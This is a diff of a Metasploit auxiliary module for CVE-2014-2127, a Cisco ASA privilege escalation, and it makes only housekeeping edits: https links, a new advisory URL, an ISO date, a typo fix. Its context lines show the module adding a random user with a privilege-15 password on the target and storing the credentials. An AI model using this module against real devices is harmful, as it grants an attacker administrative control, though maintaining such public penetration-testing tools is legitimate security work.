@@ -1,9 +1,7 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
-require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
@@ -27,10 +25,10 @@ class MetasploitModule < Msf::Auxiliary
       'References'  =>
         [
           ['CVE', '2014-2127'],
-          ['URL', 'http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140409-asa'],
-          ['URL', 'https://www3.trustwave.com/spiderlabs/advisories/TWSL2014-005.txt']
+          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20140409-asa'],
+          ['URL', 'https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18908']
         ],
-      'DisclosureDate' => 'Apr 09 2014',
+      'DisclosureDate' => '2014-04-09',
       'DefaultOptions' => { 'SSL' => true }
     ))
 
@@ -130,7 +128,7 @@ class MetasploitModule < Msf::Auxiliary
     password = Rex::Text.rand_text_alphanumeric(20)
 
     tries.times do |i|
-      vprint_good("Attemping to add User: #{username}, Pass: #{password}")
+      vprint_good("Attempting to add User: #{username}, Pass: #{password}")
       command = "username #{username} password #{password} privilege 15"
       resp = run_command(command, cookie)
 
@@ -274,5 +272,4 @@ class MetasploitModule < Msf::Auxiliary
     login_data.merge!(service_data)
     create_credential_login(login_data)
   end
-
 end
